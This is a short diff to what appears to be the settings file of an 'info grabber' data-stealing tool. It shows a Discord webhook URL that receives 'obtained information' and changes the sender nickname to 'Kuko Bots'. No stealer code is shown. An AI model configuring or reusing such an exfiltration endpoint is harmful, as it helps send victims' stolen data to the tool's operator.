@@ -22,7 +22,7 @@ your_webhook_url = 'https://discord.com/api/webhooks/1548346787020935219/so8aVkT
 
 # Create a name that shows as a profile name that sent the message with obtained information.
 
-your_webhook_nickname = ''
+your_webhook_nickname = 'Kuko Bots'
 
 # example: your_webhook_nickname = 'INFO-Grabber'
 
